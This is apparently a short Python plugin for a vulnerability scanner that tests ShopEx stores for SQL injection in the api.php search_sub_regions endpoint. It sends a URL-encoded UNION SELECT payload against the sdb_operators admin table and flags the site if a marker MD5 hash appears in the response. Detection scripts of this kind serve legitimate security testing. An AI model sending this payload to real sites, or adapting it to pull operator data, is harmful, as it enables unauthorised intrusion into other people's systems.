#!/usr/bin/env python
# -*- coding: utf-8 -*-
#__author__ = 'xfkxfk'

def assign(service, arg):
    if service == "shopex":
        return True, arg

def audit(arg):
    url = arg
    code, head, body, _, _ = curl.curl('-d p_region_id%3D1%20and%201%3D2%20union%20select%201%2Cconcat%280x23%2Cmd5%283.1415%29%2C0x23%29%2C3%20FROM%20sdb_operators%20limit%200%2C1 ' + url + '/api.php?act=search_sub_regions&api_version=1.0')
    if code == 200:
        if body and body.find('63e1f04640e83605c1d177544a5a0488') != -1:
            security_hole(url + '/api.php?act=search_sub_regions&api_version=1.0')

if __name__ == '__main__':
    from dummy import *
    audit(assign('shopex', 'http://www.example.com/')[1])